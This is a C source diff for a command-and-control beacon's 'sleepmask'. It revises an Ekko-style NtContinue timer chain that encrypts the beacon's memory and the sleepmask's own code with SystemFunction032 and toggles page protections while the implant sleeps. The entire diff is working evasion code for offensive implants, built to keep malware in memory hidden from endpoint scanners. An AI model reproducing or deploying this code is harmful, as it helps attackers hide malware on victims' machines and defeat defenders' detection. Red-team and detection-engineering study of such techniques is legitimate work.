@@ -57,6 +57,7 @@ DECLSPEC_IMPORT VOID     NTAPI NTDLL$TpReleaseTimer(PTP_TIMER timer);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtCreateEvent(PHANDLE eventHandle, ACCESS_MASK desiredAccess, PVOID objectAttributes, DWORD eventType, BOOLEAN initialState);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetEvent(HANDLE eventHandle, PLONG previousState);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE handle, BOOLEAN alertable, PLARGE_INTEGER timeout);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSignalAndWaitForSingleObject(HANDLE signalHandle, HANDLE waitHandle, BOOLEAN alertable, PLARGE_INTEGER timeout);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE handle);
 
 // --- Timer queue APIs for self-masking (Ekko chain) ---
@@ -78,6 +79,7 @@ DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
 #define NtCreateEvent         NTDLL$NtCreateEvent
 #define NtSetEvent            NTDLL$NtSetEvent
 #define NtWaitForSingleObject NTDLL$NtWaitForSingleObject
+#define NtSignalAndWaitForSingleObject NTDLL$NtSignalAndWaitForSingleObject
 #define NtClose               NTDLL$NtClose
 #define RtlCreateTimerQueue   NTDLL$RtlCreateTimerQueue
 #define RtlCreateTimer        NTDLL$RtlCreateTimer
@@ -93,8 +95,15 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
 #endif
 
     // EVENT_TYPE values for NtCreateEvent (may not be in mingw headers).
+    #ifndef EVENT_TYPE_NOTIFICATION
+    #define EVENT_TYPE_NOTIFICATION     0
+    #endif
     #ifndef EVENT_TYPE_SYNCHRONIZATION
-    #define EVENT_TYPE_SYNCHRONIZATION 1
+    #define EVENT_TYPE_SYNCHRONIZATION  1
+    #endif
+
+    #ifndef NT_SUCCESS
+    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
     #endif
 
     // --- USTRING for SystemFunction032 ---
@@ -108,12 +117,14 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     typedef NTSTATUS (WINAPI *SystemFunction032_t)(PUSTRING data, PUSTRING key);
 
     // --- Resolved function pointers for self-masking ---
-    static SystemFunction032_t   pSystemFunction032  = NULL;
-    static LPVOID                pVirtualProtect     = NULL;
-    static LPVOID                pNtContinue         = NULL;
-    static LPVOID                pNtTestAlert        = NULL;
-    static LPVOID                pWaitForSingleObject = NULL;
-    static BOOL                  selfMaskReady       = FALSE;
+    static SystemFunction032_t   pSystemFunction032     = NULL;
+    static LPVOID                pVirtualProtect        = NULL;
+    static LPVOID                pNtContinue            = NULL;
+    static LPVOID                pNtTestAlert           = NULL;
+    static LPVOID                pWaitForSingleObjectEx = NULL;
+    static LPVOID                pSetEvent              = NULL;
+    static LPVOID                pRtlCaptureContext     = NULL;
+    static BOOL                  selfMaskReady          = FALSE;
 
     /**
     * Resolve function pointers needed for the self-masking timer chain.
@@ -131,14 +142,17 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
             return FALSE;
         }
 
-        pSystemFunction032   = (SystemFunction032_t)GetProcAddress(hAdvapi32, "SystemFunction032");
-        pVirtualProtect      = (LPVOID)GetProcAddress(hKernel32, "VirtualProtect");
-        pNtContinue          = (LPVOID)GetProcAddress(hNtdll, "NtContinue");
-        pNtTestAlert         = (LPVOID)GetProcAddress(hNtdll, "NtTestAlert");
-        pWaitForSingleObject = (LPVOID)GetProcAddress(hKernel32, "WaitForSingleObject");
+        pSystemFunction032     = (SystemFunction032_t)GetProcAddress(hAdvapi32, "SystemFunction032");
+        pVirtualProtect        = (LPVOID)GetProcAddress(hKernel32, "VirtualProtect");
+        pNtContinue            = (LPVOID)GetProcAddress(hNtdll, "NtContinue");
+        pNtTestAlert           = (LPVOID)GetProcAddress(hNtdll, "NtTestAlert");
+        pWaitForSingleObjectEx = (LPVOID)GetProcAddress(hKernel32, "WaitForSingleObjectEx");
+        pSetEvent              = (LPVOID)GetProcAddress(hKernel32, "SetEvent");
+        pRtlCaptureContext     = (LPVOID)GetProcAddress(hNtdll, "RtlCaptureContext");
 
         if (!pSystemFunction032 || !pVirtualProtect || !pNtContinue ||
-            !pNtTestAlert || !pWaitForSingleObject) {
+            !pNtTestAlert || !pWaitForSingleObjectEx || !pSetEvent ||
+            !pRtlCaptureContext) {
             DLOG("SLEEPMASK: Failed to resolve function pointers for self-masking\n");
             return FALSE;
         }
@@ -201,44 +215,51 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     * Performs a thread pool timer sleep cycle with self-masking.
     *
     * Uses an Ekko-style NtContinue timer chain to encrypt the sleepmask's
-    * own .text section during sleep via SystemFunction032 (advapi32). The
-    * chain uses RtlCreateTimer with WT_EXECUTEINTIMERTHREAD to serialize
-    * all callbacks on the dedicated timer thread:
+    * own .text section during sleep via SystemFunction032 (advapi32).
     *
-    *   T1: VirtualProtect(sleepmask, PAGE_READWRITE)
-    *   T2: SystemFunction032(encrypt sleepmask code)
-    *   T3: WaitForSingleObject(hDelayEvent, sleepMs) — the actual sleep
-    *   T4: SystemFunction032(decrypt sleepmask code)
-    *   T5: VirtualProtect(sleepmask, PAGE_EXECUTE_READ)
-    *   T6: WakeCallback — UnMaskBeacon + NtSetEvent(hWakeEvent)
+    * Context is captured on the timer thread itself (via RtlCaptureContext
+    * as a timer callback), eliminating the race condition of capturing on
+    * the main thread. Three events synchronize the phases:
+    *   - EvntTimer: signals that context capture is complete
+    *   - EvntStart: gates the chain until main thread is ready
+    *   - EvntEnd:   signals chain completion to wake main thread
     *
-    * T1-T5 use NtContinue as the timer callback function, which replaces
-    * the timer thread's context to call system DLL functions that live
-    * outside the sleepmask code. NtTestAlert is the return address for
-    * each context, draining queued timer APCs in order.
+    * Timer chain (WT_EXECUTEINTIMERTHREAD, serialized):
+    *   Setup:  RtlCaptureContext → SetEvent(EvntTimer)
+    *   Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE) — gate
+    *   Ctx[1]: VirtualProtect(sleepmask, PAGE_READWRITE)
+    *   Ctx[2]: SystemFunction032(encrypt sleepmask code)
+    *   Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs) — sleep
+    *   Ctx[4]: SystemFunction032(decrypt sleepmask code)
+    *   Ctx[5]: VirtualProtect(sleepmask, PAGE_EXECUTE_READ)
+    *   Ctx[6]: SetEvent(EvntEnd) — wake main thread
     *
-    * If self-masking is not available, falls back to basic TpAllocTimer sleep.
+    * NtSignalAndWaitForSingleObject atomically unblocks the chain and
+    * waits for completion. UnMaskBeacon runs on the main thread after wake.
+    *
+    * Falls back to basic TpAllocTimer sleep if self-masking is unavailable.
     *
     * @param info      A pointer to a BEACON_INFO structure.
     * @param sleepMs   The sleep duration in milliseconds.
     */
     void ThreadPoolTimerSleep(PBEACON_INFO info, DWORD sleepMs) {
-        HANDLE       hWakeEvent  = NULL;
-        HANDLE       hDelayEvent = NULL;
         HANDLE       hTimerQueue = NULL;
+        HANDLE       hEvntTimer  = NULL;
+        HANDLE       hEvntStart  = NULL;
+        HANDLE       hEvntEnd    = NULL;
         NTSTATUS     status      = 0;
 
-        // [0] Create the wake event (auto-reset, signals main thread).
-        status = NtCreateEvent(&hWakeEvent, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_SYNCHRONIZATION, FALSE);
-        if (status != 0 || hWakeEvent == NULL) {
-            DLOGF("SLEEPMASK: Failed to create wake event: 0x%08X\n", status);
-            return;
-        }
-
-        // [1] If self-masking is not available, fall back to TpAllocTimer.
+        // [0] If self-masking is not available, fall back to TpAllocTimer.
         if (!selfMaskReady) {
+            HANDLE       hWakeEvent = NULL;
             PTP_TIMER    pTimer = NULL;
             LARGE_INTEGER dueTime;
+
+            status = NtCreateEvent(&hWakeEvent, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_SYNCHRONIZATION, FALSE);
+            if (status != 0 || hWakeEvent == NULL) {
+                DLOGF("SLEEPMASK: Failed to create wake event: 0x%08X\n", status);
+                return;
+            }
 
             TP_TIMER_CONTEXT timerCtx;
             _memset(&timerCtx, 0, sizeof(timerCtx));
@@ -269,13 +290,13 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
 
         // --- Self-masking path (Ekko-style NtContinue timer chain) ---
 
-        // [2] Save self-masking parameters before MaskBeacon encrypts them.
+        // [1] Save self-masking parameters before MaskBeacon encrypts them.
         char  maskKeyCopy[MASK_SIZE];
         _memcpy(maskKeyCopy, info->mask, MASK_SIZE);
         char* sleepMaskPtr      = info->sleep_mask_ptr;
         DWORD sleepMaskTextSize = info->sleep_mask_text_size;
 
-        // [3] Set up USTRING structs for SystemFunction032.
+        // [2] Set up USTRING structs for SystemFunction032.
         USTRING imgData;
         imgData.Length        = sleepMaskTextSize;
         imgData.MaximumLength = sleepMaskTextSize;
@@ -286,135 +307,136 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         imgKey.MaximumLength = MASK_SIZE;
         imgKey.Buffer        = maskKeyCopy;
 
-        // [4] Create the delay event (never signaled — WaitForSingleObject
-        //     will timeout after sleepMs, implementing the actual sleep).
-        status = NtCreateEvent(&hDelayEvent, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_SYNCHRONIZATION, FALSE);
-        if (status != 0 || hDelayEvent == NULL) {
-            DLOGF("SLEEPMASK: Failed to create delay event: 0x%08X\n", status);
-            NtClose(hWakeEvent);
-            return;
+        // [3] Create three notification events for synchronization.
+        //     EvntTimer: signaled when RtlCaptureContext completes on timer thread.
+        //     EvntStart: gates the NtContinue chain until main thread is ready.
+        //     EvntEnd:   signaled by chain completion to wake main thread.
+        if (!NT_SUCCESS(status = NtCreateEvent(&hEvntTimer, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE)) ||
+            !NT_SUCCESS(status = NtCreateEvent(&hEvntStart, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE)) ||
+            !NT_SUCCESS(status = NtCreateEvent(&hEvntEnd,   EVENT_ALL_ACCESS, NULL, EVENT_TYPE_NOTIFICATION, FALSE))) {
+            DLOGF("SLEEPMASK: Failed to create events: 0x%08X\n", status);
+            goto LEAVE;
         }
 
-        // [5] Set up TP_TIMER_CONTEXT for the wake callback (T6).
-        TP_TIMER_CONTEXT timerCtx;
-        _memset(&timerCtx, 0, sizeof(timerCtx));
-        timerCtx.BeaconInfo = info;
-        timerCtx.hWakeEvent = hWakeEvent;
-
-        // [6] Capture the current thread context as a template.
-        //     The volatile guard detects if the timer thread "returns" here
-        //     after the NtContinue chain completes — parks it safely.
-        volatile int returnGuard = 0;
-        CONTEXT ctxBase;
-        _memset(&ctxBase, 0, sizeof(ctxBase));
-        ctxBase.ContextFlags = CONTEXT_FULL;
-        RtlCaptureContext(&ctxBase);
-
-        if (returnGuard != 0) {
-            // Timer thread escaped here via NtTestAlert after the
-            // callback chain completed. Park it to prevent re-executing
-            // the sleep setup code. The timer queue deletion handles cleanup.
-            return;
-        }
-        returnGuard = 1;
-
-        // [7] Build NtContinue CONTEXT structs for T1-T5.
-        //     Each context's [Rsp] = NtTestAlert (return address).
-        //     Static to avoid exceeding the 4KB stack probe threshold.
-        static CONTEXT ctxVpRw, ctxEncrypt, ctxDelay, ctxDecrypt, ctxVpRx;
-        DWORD   oldProtect = 0;
-
-        // T1: VirtualProtect(sleepmask, size, PAGE_READWRITE, &oldProtect)
-        _memcpy(&ctxVpRw, (void*)&ctxBase, sizeof(CONTEXT));
-        ctxVpRw.Rsp -= 8;
-        *(ULONG_PTR*)(ctxVpRw.Rsp) = (ULONG_PTR)pNtTestAlert;
-        ctxVpRw.Rip = (DWORD64)pVirtualProtect;
-        ctxVpRw.Rcx = (DWORD64)sleepMaskPtr;
-        ctxVpRw.Rdx = (DWORD64)sleepMaskTextSize;
-        ctxVpRw.R8  = (DWORD64)PAGE_READWRITE;
-        ctxVpRw.R9  = (DWORD64)&oldProtect;
-
-        // T2: SystemFunction032(&imgData, &imgKey) — encrypt
-        _memcpy(&ctxEncrypt, (void*)&ctxBase, sizeof(CONTEXT));
-        ctxEncrypt.Rsp -= 8;
-        *(ULONG_PTR*)(ctxEncrypt.Rsp) = (ULONG_PTR)pNtTestAlert;
-        ctxEncrypt.Rip = (DWORD64)pSystemFunction032;
-        ctxEncrypt.Rcx = (DWORD64)&imgData;
-        ctxEncrypt.Rdx = (DWORD64)&imgKey;
-
-        // T3: WaitForSingleObject(hDelayEvent, sleepMs) — THE ACTUAL SLEEP
-        _memcpy(&ctxDelay, (void*)&ctxBase, sizeof(CONTEXT));
-        ctxDelay.Rsp -= 8;
-        *(ULONG_PTR*)(ctxDelay.Rsp) = (ULONG_PTR)pNtTestAlert;
-        ctxDelay.Rip = (DWORD64)pWaitForSingleObject;
-        ctxDelay.Rcx = (DWORD64)hDelayEvent;
-        ctxDelay.Rdx = (DWORD64)sleepMs;
-
-        // T4: SystemFunction032(&imgData, &imgKey) — decrypt
-        _memcpy(&ctxDecrypt, (void*)&ctxBase, sizeof(CONTEXT));
-        ctxDecrypt.Rsp -= 8;
-        *(ULONG_PTR*)(ctxDecrypt.Rsp) = (ULONG_PTR)pNtTestAlert;
-        ctxDecrypt.Rip = (DWORD64)pSystemFunction032;
-        ctxDecrypt.Rcx = (DWORD64)&imgData;
-        ctxDecrypt.Rdx = (DWORD64)&imgKey;
-
-        // T5: VirtualProtect(sleepmask, size, PAGE_EXECUTE_READ, &oldProtect)
-        _memcpy(&ctxVpRx, (void*)&ctxBase, sizeof(CONTEXT));
-        ctxVpRx.Rsp -= 8;
-        *(ULONG_PTR*)(ctxVpRx.Rsp) = (ULONG_PTR)pNtTestAlert;
-        ctxVpRx.Rip = (DWORD64)pVirtualProtect;
-        ctxVpRx.Rcx = (DWORD64)sleepMaskPtr;
-        ctxVpRx.Rdx = (DWORD64)sleepMaskTextSize;
-        ctxVpRx.R8  = (DWORD64)PAGE_EXECUTE_READ;
-        ctxVpRx.R9  = (DWORD64)&oldProtect;
-
-        // [8] Create the timer queue.
+        // [4] Create the timer queue.
         status = RtlCreateTimerQueue(&hTimerQueue);
         if (status != 0 || hTimerQueue == NULL) {
             DLOGF("SLEEPMASK: Failed to create timer queue: 0x%08X\n", status);
-            NtClose(hDelayEvent);
-            NtClose(hWakeEvent);
-            return;
+            goto LEAVE;
         }
 
-        // [9] Queue T1-T6 timers with WT_EXECUTEINTIMERTHREAD.
-        //     All callbacks execute on the dedicated timer thread, serialized.
-        HANDLE hTimer = NULL;
+        {
+            HANDLE  hTimer = NULL;
+            DWORD   Delay  = 0;
+            DWORD   oldProtect = 0;
 
-        // T1: VirtualProtect(RW) at +100ms
-        RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &ctxVpRw,
-                        100, 0, WT_EXECUTEINTIMERTHREAD);
+            // [5] Queue setup timers: capture context on the timer thread,
+            //     then signal EvntTimer so the main thread knows it's done.
+            CONTEXT CtxInit;
+            _memset(&CtxInit, 0, sizeof(CtxInit));
 
-        // T2: SystemFunction032(encrypt) at +200ms
-        RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &ctxEncrypt,
-                        200, 0, WT_EXECUTEINTIMERTHREAD);
+            if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pRtlCaptureContext, &CtxInit,
+                                                    Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
+                DLOGF("SLEEPMASK: RtlCreateTimer(RtlCaptureContext) failed: 0x%08X\n", status);
+                goto LEAVE;
+            }
 
-        // T3: WaitForSingleObject(delay) at +300ms
-        RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &ctxDelay,
-                        300, 0, WT_EXECUTEINTIMERTHREAD);
+            if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pSetEvent, hEvntTimer,
+                                                    Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
+                DLOGF("SLEEPMASK: RtlCreateTimer(SetEvent) failed: 0x%08X\n", status);
+                goto LEAVE;
+            }
 
-        // T4: SystemFunction032(decrypt) at +400ms
-        RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &ctxDecrypt,
-                        400, 0, WT_EXECUTEINTIMERTHREAD);
+            // [6] Wait for the timer thread to finish capturing its context.
+            if (!NT_SUCCESS(status = NtWaitForSingleObject(hEvntTimer, FALSE, NULL))) {
+                DLOGF("SLEEPMASK: NtWaitForSingleObject(EvntTimer) failed: 0x%08X\n", status);
+                goto LEAVE;
+            }
 
-        // T5: VirtualProtect(RX) at +500ms
-        RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &ctxVpRx,
-                        500, 0, WT_EXECUTEINTIMERTHREAD);
+            // [7] Build 7 NtContinue CONTEXT structs from the captured timer-thread context.
+            //     Static array to avoid exceeding the 4KB stack probe threshold.
+            static CONTEXT Ctx[7];
 
-        // T6: WakeCallback (normal) at +600ms
-        RtlCreateTimer(hTimerQueue, &hTimer, (PVOID)WakeCallback, &timerCtx,
-                        600, 0, WT_EXECUTEINTIMERTHREAD);
+            for (int i = 0; i < 7; i++) {
+                _memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
+                Ctx[i].Rsp -= sizeof(PVOID);
+                *(ULONG_PTR*)(Ctx[i].Rsp) = (ULONG_PTR)pNtTestAlert;
+            }
 
-        // [10] Mask beacon memory (encrypt sections + heap records).
-        MaskBeacon(info);
+            // Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, NULL) — gate
+            Ctx[0].Rip = (DWORD64)pWaitForSingleObjectEx;
+            Ctx[0].Rcx = (DWORD64)hEvntStart;
+            Ctx[0].Rdx = (DWORD64)INFINITE;
+            Ctx[0].R8  = (DWORD64)0;
 
-        // [11] Block until WakeCallback signals hWakeEvent.
-        NtWaitForSingleObject(hWakeEvent, FALSE, NULL);
+            // Ctx[1]: VirtualProtect(sleepmask, size, PAGE_READWRITE, &oldProtect)
+            Ctx[1].Rip = (DWORD64)pVirtualProtect;
+            Ctx[1].Rcx = (DWORD64)sleepMaskPtr;
+            Ctx[1].Rdx = (DWORD64)sleepMaskTextSize;
+            Ctx[1].R8  = (DWORD64)PAGE_READWRITE;
+            Ctx[1].R9  = (DWORD64)&oldProtect;
 
-        // [12] Clean up timer queue and events.
-        RtlDeleteTimerQueue(hTimerQueue);
-        NtClose(hDelayEvent);
-        NtClose(hWakeEvent);
+            // Ctx[2]: SystemFunction032(&imgData, &imgKey) — encrypt
+            Ctx[2].Rip = (DWORD64)pSystemFunction032;
+            Ctx[2].Rcx = (DWORD64)&imgData;
+            Ctx[2].Rdx = (DWORD64)&imgKey;
+
+            // Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs, FALSE) — THE ACTUAL SLEEP
+            Ctx[3].Rip = (DWORD64)pWaitForSingleObjectEx;
+            Ctx[3].Rcx = (DWORD64)((HANDLE)(LONG_PTR)-1);
+            Ctx[3].Rdx = (DWORD64)sleepMs;
+            Ctx[3].R8  = (DWORD64)0;
+
+            // Ctx[4]: SystemFunction032(&imgData, &imgKey) — decrypt
+            Ctx[4].Rip = (DWORD64)pSystemFunction032;
+            Ctx[4].Rcx = (DWORD64)&imgData;
+            Ctx[4].Rdx = (DWORD64)&imgKey;
+
+            // Ctx[5]: VirtualProtect(sleepmask, size, PAGE_EXECUTE_READ, &oldProtect)
+            Ctx[5].Rip = (DWORD64)pVirtualProtect;
+            Ctx[5].Rcx = (DWORD64)sleepMaskPtr;
+            Ctx[5].Rdx = (DWORD64)sleepMaskTextSize;
+            Ctx[5].R8  = (DWORD64)PAGE_EXECUTE_READ;
+            Ctx[5].R9  = (DWORD64)&oldProtect;
+
+            // Ctx[6]: SetEvent(EvntEnd) — wake main thread
+            Ctx[6].Rip = (DWORD64)pSetEvent;
+            Ctx[6].Rcx = (DWORD64)hEvntEnd;
+
+            // [8] Queue 7 NtContinue timers (chain phase).
+            for (int i = 0; i < 7; i++) {
+                if (!NT_SUCCESS(status = RtlCreateTimer(hTimerQueue, &hTimer, pNtContinue, &Ctx[i],
+                                                        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
+                    DLOGF("SLEEPMASK: RtlCreateTimer(NtContinue[%d]) failed: 0x%08X\n", i, status);
+                    goto LEAVE;
+                }
+            }
+
+            // [9] Mask beacon memory (encrypt sections + heap records).
+            MaskBeacon(info);
+
+            // [10] Atomically signal EvntStart (unblocks the timer chain)
+            //      and wait on EvntEnd (blocks until chain completes).
+            NtSignalAndWaitForSingleObject(hEvntStart, hEvntEnd, FALSE, NULL);
+
+            // [11] Unmask beacon memory — sleepmask code is decrypted + RX.
+            UnMaskBeacon(info);
+        }
+
+        // [12] Clean up.
+    LEAVE:
+        if (hTimerQueue) {
+            RtlDeleteTimerQueue(hTimerQueue);
+        }
+        if (hEvntTimer) {
+            NtClose(hEvntTimer);
+        }
+        if (hEvntStart) {
+            NtClose(hEvntStart);
+        }
+        if (hEvntEnd) {
+            NtClose(hEvntEnd);
+        }
 
         // Zero the mask key copy.
         volatile char* vKey = maskKeyCopy;
